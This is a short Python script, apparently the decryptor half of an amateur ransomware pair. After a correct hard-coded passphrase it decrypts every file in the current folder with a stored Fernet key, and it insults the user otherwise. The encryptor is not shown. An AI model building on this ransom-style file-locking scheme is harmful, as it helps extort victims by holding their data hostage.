#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


#we are going to get your files


files = []

for file in os.listdir():
	if file == "cheeto.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


with open("thekey.key", "rb") as key:
	secretkey = key.read()


secretphrase = "success is a dream"

user_phrase = input("There is a secret phrase, once you have entered it you will gain access to your files once again.\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Well done, you have gotten the secret phrase correct.")
else:
	print("Fucking idiot, that's not the phrase.")
